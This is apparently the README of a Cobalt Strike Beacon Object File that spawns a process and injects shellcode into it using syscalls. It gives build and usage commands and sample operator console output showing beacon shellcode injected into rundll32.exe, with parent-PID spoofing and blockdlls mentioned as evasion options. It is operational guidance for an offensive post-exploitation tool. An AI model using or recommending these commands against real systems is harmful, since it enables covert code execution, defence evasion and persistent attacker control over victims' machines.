## Spawn with Syscalls Shellcode Injection BOF (64-bit only)

Same syscalls injection process as SyscallsInject but uses `BeaconSpawnTemporaryProcess` to create the target process. 

## Compile

```
make
```

## Usage

Aggressor script included with the following commands:
- `syscalls_spawn listener_name` - Injects shellcode for beacon into a spawned process. 
- `syscalls_shspawn path_to_bin` - Injects custom shellcode into a spawned process.

> NOTE: As we're using the beacon API for process spawn, we're not using syscalls, so bear that in mind. Spawning in this way does give us the spawnto, blockdlls and ppid spoof values applied. Although blockdlls currently causes the beacon launch to fail. 

### Custom shellcode
```
beacon> syscalls_shspawn C:\Users\user\Desktop\beacon64.bin
[*] Syscalls Spawn and Shellcode Injection BOF (@ajpc500)
[*] Reading shellcode from: C:\Users\user\Desktop\beacon64.bin
[+] host called home, sent: 266531 bytes
[+] received output:
Using spawnto process: C:\WINDOWS\system32\rundll32.exe
[+] received output:
Spawned Process with PID: 9968
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> syscalls_spawn http
[*] Syscalls Spawn and Shellcode Injection BOF (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 266531 bytes
[+] received output:
Using spawnto process: C:\WINDOWS\system32\rundll32.exe
[+] received output:
Spawned Process with PID: 9768
[+] received output:
Shellcode injection completed successfully!
```